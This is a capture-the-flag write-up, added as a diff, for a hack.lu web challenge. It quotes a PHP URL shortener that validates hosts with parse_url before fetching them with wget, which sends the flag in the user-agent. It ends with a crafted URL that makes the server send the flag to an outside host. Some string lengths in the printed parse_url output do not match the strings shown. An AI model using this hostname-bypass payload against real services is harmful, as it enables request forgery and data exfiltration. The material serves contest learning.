@@ -1,0 +1,142 @@
+# Writeup for the Cornelius1's hack.lu chall
+
+**Keywords**: PHP, HTTP RFC, wget, parse_url
+
+**Category**: Web
+
+**Points**: 200
+
+Problem statement :
+
+```text
+We developed this url shortener, it will allow you to share links with your friends!
+http://9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site:20000/
+
+Hint
+You will need to bypass the check for the hostname and send the request somewhere else!
+Source code: https://paste.null-life.com/#/sGv1ZrIyhAAYCQMa6p8UFm2IFvzZhJ9yAYtkHgCcCz7bu8YE/66lTyw0 
+```
+
+No team that flagged this task during the first day so the admin decided to give us the source code (you will see that even with it, it is not obvious):
+
+```php
+include 'config.php';
+
+if (isset($_GET['i']) && $_GET['i'] == 1) {
+        header("Location: https://ctf.ekoparty.org");
+        exit();
+}
+
+// ...
+
+function page_title($url) {
+        $fp = get_data($url);
+        if (!$fp)
+            return "(no title)";
+        $res = preg_match("/<title>(.*)<\/title>/siU", $fp, $title_matches);
+        if (!$res)
+            return "(no title)";
+        $title = preg_replace('/\s+/', ' ', $title_matches[1]);
+        $title = trim($title);
+                if ($title == "") $title = "(no title)";
+        return $title;
+}
+
+function get_data($url) {
+        require(".htflag.php");
+        $url = escapeshellarg($url);
+        $flag = escapeshellarg($flag);
+        exec("wget -qO-  --user-agent $flag $url", $output);
+        return implode("\r\n", $output);
+}
+
+
+$url = isset($_POST['url']) ? $_POST['url'] : "";
+
+if ($url != "" && !empty($_POST['g-recaptcha-response']) ) {
+        require('captcha/autoload.php');
+        $recaptcha = new \ReCaptcha\ReCaptcha($secret_key);
+        $resp = $recaptcha->verify($_POST['g-recaptcha-response'], $_SERVER['REMOTE_ADDR']);
+
+        echo '<md-whiteframe class="md-whiteframe-1dp" layout layout-align="center center">';
+
+        if ($resp->isSuccess()) {
+
+                $pu = parse_url($url);
+                if (isset($pu["host"]) && isset($pu["scheme"])) {
+                        if ($pu["host"] === "ctf.ekoparty.org" && ($pu["scheme"] === "http"||$pu["scheme"] === "https")) {
+                                echo "<p>Accepted hostname <b ng-non-bindable>".htmlentities($pu["host"])."</b><br/><br/>";
+                                $response = page_title($url);
+                                echo "<b>Title:&nbsp;</b><span  ng-non-bindable>" . htmlentities($response)."</span><br/>";
+                                echo "<b>Short Link:&nbsp;</b><a href='?i=1'>http://9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site:20000/?i=1</a></p>";
+                        } else {
+                                echo "<p>Error, hostname not allowed</p>&nbsp; <p><b ng-non-bindable>".htmlentities($pu["host"])."</b></p>";
+                        }
+                } else {
+                        echo "<p>Invalid URL&nbsp;<b ng-non-bindable>".htmlentities($url)."</b></p>";
+                }
+
+        } else  {
+                echo "<p>Invalid CAPTCHA&nbsp;</p>";
+        }
+
+        echo '</md-whiteframe>';
+
+}
+// ...
+```
+
+Of course we don't have access to *.htflag.php*. 
+
+The goal of the task is to bypass the hostname filter. So I looked for strange URLs that either *wget* or php *parse_url* would have some trouble checking.
+
+I found that you can specify the HTTP username and password in the URL :
+
+```text
+http://hugodelva:pass98456@ctf.ekoparty.org/
+```
+
+So I tried : 
+
+```text
+http://hugodelval.com:80@ctf.ekoparty.org/
+```
+
+But both *wget* and *parse_url* parse this address perfectly :/.
+
+But here is another URL, derived from the one before:
+
+```
+http://what:ever@hugodelval.com:80@ctf.ekoparty.org/
+```
+
+We got something ! PHP parse this URL as :
+
+```php
+array(5) {
+  ["scheme"]=>
+  string(4) "http"
+  ["host"]=>
+  string(16) "ctf.ekoparty.org"
+  ["user"]=>
+  string(2) "what"
+  ["pass"]=>
+  string(21) "hugodelval.com:80"
+  ["path"]=>
+  string(1) "/"
+}
+```
+
+So it bypasses the filters. And *wget* see this URL as : ```username:what``` - ```password:ever``` - ```host:hugodelval.com:80@ctf.ekoparty.org/```
+
+So we are quite there ! Php takes the hostname after the last ```@``` to the first ```/``` and *wget* do the opposite : takes the hostname after the first ```@```.
+
+Which leads us to our final payload : 
+
+```
+http://what:ever@hugodelval.com:80?@ctf.ekoparty.org/
+```
+
+And here we are :)
+
+I don't know which one of *PHP* or *wget* did not follow the RFC but if I have to guess I'd say PHP x)
